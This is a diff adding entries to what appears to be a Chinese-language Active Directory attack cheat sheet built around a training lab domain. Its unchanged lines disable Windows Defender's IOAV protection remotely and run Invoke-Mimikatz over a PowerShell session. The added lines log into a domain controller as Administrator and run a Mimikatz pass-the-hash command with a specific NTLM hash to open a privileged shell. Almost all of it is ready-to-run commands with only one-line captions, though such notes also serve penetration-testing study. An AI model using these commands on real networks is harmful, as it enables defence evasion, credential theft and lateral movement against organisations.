@@ -28,3 +28,14 @@ Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Sess
 ```
 Invoke-command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess
 ```
+
+
+# 以某个用户的身份登录到某台电脑（需要明文密码）
+```
+Enter-PSSession –Computername dcorp-dc –credential dcorp\Administrator
+```
+
+# 以某个用户的身份打开一个新的shell，有这个用户的所有权限，但是还在本机环境中（需要NTML）
+```
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:srvadmin /domain:dollarcorp.moneycorp.local /ntlm:a98e18228819e8eec3dfa33cb68b0728 /run:powershell.exe"'
+```
